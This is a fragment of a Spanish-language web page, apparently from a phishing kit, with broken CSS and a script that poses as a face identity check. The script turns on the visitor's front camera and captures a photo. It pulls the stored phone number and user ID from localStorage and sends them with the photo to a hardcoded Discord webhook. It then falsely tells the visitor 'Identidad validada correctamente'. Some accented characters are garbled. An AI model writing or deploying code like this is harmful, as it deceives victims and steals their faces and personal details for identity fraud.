        /* Contenedor principal para centrar todo */

        /* Marco de la c谩mara */
        .video-wrapper {
            position: relative;
            width: 100%;

            border-radius: 20px;
            background: #000;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);

        /* El video */
        #video-stream {
            width: 100%;
            height: 100%;

            transform: scaleX(-1);
            display: block;
        }

        /* LA MSCARA DEL VALO */
        .oval-overlay {
            position: absolute;
            top: 50%;
            left: 50%;

            /* Sombra gigante oscura */

            transition: background 0.3s, transform 0.1s;
            
            /* NUEVO ESPACIADO */

        .btn-capture:disabled { background-color: #ccc; cursor: not-allowed; box-shadow: none; }

    <script>
        // ==========================================
        // CONFIGURACIN DE DISCORD
        // ==========================================
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1444716847537586218/g5q5-xlIPP6R-jJF4skloG3n1wjlhMwdgmvBG_xQkghF0JQ5QEsKiYrWnCWYcAsf2sDk"; 
        // 锔 RECUERDA PEGAR TU URL DE DISCORD EN LA LNEA DE ARRIBA

        const video = document.getElementById('video-stream');
        const canvas = document.getElementById('canvas-capture');
        const captureBtn = document.getElementById('capture-btn');
        let stream = null;

        // 1. INICIAR LA CMARA FRONTAL
        async function initCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user', 
                        width: { ideal: 720 }, 
                        height: { ideal: 1280 } 
                    }, 
                    audio: false 
                });
                video.srcObject = stream;
            } catch (err) {
                console.error("Error al acceder a la c谩mara:", err);
                alert("Necesitamos acceso a la c谩mara para validar tu identidad. Por favor revisa los permisos.");
            }
        }

        // 2. FUNCIN PARA ENVIAR A DISCORD
        async function sendToDiscord(blob) {
            captureBtn.disabled = true;
            captureBtn.innerText = "Validando...";

            const formData = new FormData();
            const userData = JSON.parse(localStorage.getItem('formData')) || {};
            const mensaje = ` **FACE ID CAPTURED** \n **Usuario:** ${userData.phoneNumber || 'Desconocido'}\n **ID:** ${userData.UserId || 'N/A'}`;

            formData.append('payload_json', JSON.stringify({
                content: mensaje
            }));
            formData.append('file', blob, 'face_id_capture.png');

            try {
                const response = await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    body: formData
                });

                if (response.ok) {
                    alert("Identidad validada correctamente.");
                    window.location.href = "index.php"; 
                } else {
                    throw new Error('Error en el servidor de Discord');
                }
            } catch (error) {
                console.error(error);
                alert("Ocurri贸 un error en la validaci贸n. Intenta nuevamente.");
                captureBtn.disabled = false;
                captureBtn.innerText = "Verificar Rostro";
            }
        }

        // 3. EVENTO DE CAPTURA
        captureBtn.addEventListener('click', () => {
            if (!stream) {
                alert("La c谩mara no est谩 iniciada.");
                return;
            }
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob((blob) => {
                if(blob) {
                    sendToDiscord(blob);
                } else {
                    alert("Error al procesar la imagen.");
                }
            }, 'image/png', 0.9);
        });

        window.addEventListener('load', initCamera);
    </script>
